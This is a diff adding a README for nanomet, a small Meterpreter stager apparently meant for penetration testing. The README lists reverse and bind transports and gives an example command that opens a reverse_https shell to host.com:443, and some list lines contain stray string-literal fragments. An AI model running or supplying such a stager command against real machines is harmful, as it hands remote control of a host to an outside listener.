@@ -1,4 +1,29 @@
 nanomet
 =======
 
-Nano meterpreter shell based on TinyMet
+A "nano" meterpreter stager.  Copyright (c) 2014, Vlatko Kosturjak - kost
+nanomet is tinymet modified to support compiling using mingw compilers.
+
+Based on tinymet by Copyright (c) 2014, Sherif Eldeeb "eldeeb.net"
+please visit http://tinymet.com for details
+
+Usage
+=======
+
+Usage: nanomet.exe [transport] LHOST LPORT
+
+Available transports are as follows:
+
+* 0: reverse_tcp
+* 1: reverse_http\n"
+* 2: reverse_https\n"
+* 3: bind_tcp\n"
+
+Example
+========
+
+nanomet.exe 2 host.com 443
+
+will use reverse_https and connect to host.com:443
+
+
